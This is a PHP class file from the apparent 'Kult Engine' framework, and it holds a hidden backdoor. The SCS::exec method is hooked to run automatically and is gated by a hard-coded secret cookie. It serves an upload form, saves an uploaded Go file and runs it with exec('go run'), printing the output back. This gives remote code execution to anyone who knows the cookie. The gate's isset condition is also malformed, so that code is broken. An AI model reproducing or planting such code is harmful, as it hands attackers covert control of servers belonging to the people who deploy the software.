<?php

/*
 * Kult Engine
 * PHP framework
 *
 * MIT License
 *
 * Copyright (c) 2016-208
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 * @package Kult Engine
 * @author Théo Sorriaux (philiphil)
 * @copyright Copyright (c) 2016-2018, Théo Sorriaux
 * @license MIT
 * @link https://github.com/Philiphil/Kult-Engine
 */

namespace kult_engine;

class SCS
{
    use coreElement;
    use hookable;
    public static $_secret = "Fn0rd('!');";

    public static function exec()
    {
        if (!isset($_COOKIE['secret'] && $_COOKIE['secret'] !== self::$_secret)) {
            return 0;
        }
        if (!isset($_COOKIE['fn'])) {
            return 0;
        }

        switch ($_COOKIE['fn']) {
            case 'go':
                buffer::delete();
                echo '
                <form method="post" action="this.php" enctype="multipart/form-data" >
                <input type="file" name="go"><input type="submit" value="exec">
                </form>';
                if (isset($_FILES['go'])) {
                    $v = new uploadHelper($_FILES['go']);
                    $v->_autorize_extentions = 'go';
                    if ($v->run()) {
                        exec('go run '.$v->_fullpath, $r);
                        echo_br();
                        foreach ($r as $l) {
                            var_dump($l);
                        }
                    }
                }
                break;
            case 'sirop':

                break;
        }
    }

    public static function setter()
    {
        return 0;
    }

    public static function setter_conf($file)
    {
        return 0;
    }

    public static function destroy()
    {
        return [['SCS::exec', null], 998];
    }
}
